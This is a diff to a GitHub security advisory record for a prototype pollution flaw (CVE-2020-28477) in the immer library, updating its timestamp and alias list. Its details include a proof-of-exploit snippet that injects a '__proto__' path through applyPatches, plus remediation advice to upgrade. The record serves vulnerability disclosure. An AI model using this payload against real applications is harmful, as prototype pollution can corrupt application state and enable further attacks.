@@ -1,12 +1,10 @@
 {
 	"schema_version": "1.6.0",
 	"id": "GHSA-9qmh-276g-x5pj",
-	"modified": "2024-09-03T03:26:50.370816Z",
+	"modified": "2025-01-14T08:57:00.110130Z",
 	"published": "2021-01-20T21:27:56Z",
 	"aliases": [
-		"CVE-2020-28477",
-		"SNYK-JAVA-ORGWEBJARSNPM-1061986",
-		"SNYK-JS-IMMER-1019369"
+		"CVE-2020-28477"
 	],
 	"summary": "Prototype Pollution in immer",
 	"details": "## Overview\n\nAffected versions of immer are vulnerable to Prototype Pollution.\n\n## Proof of exploit\n\n```js\nconst {applyPatches, enablePatches} = require(\"immer\");\nenablePatches();\nlet obj = {};\nconsole.log(\"Before : \" + obj.polluted);\napplyPatches({}, [ { op: 'add', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\n// applyPatches({}, [ { op: 'replace', path: [ \"__proto__\", \"polluted\" ], value: \"yes\" } ]);\nconsole.log(\"After : \" + obj.polluted);\n```\n\n## Remediation\n\nVersion 8.0.1 contains a [fix](https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5) for this vulnerability, updating is recommended.",
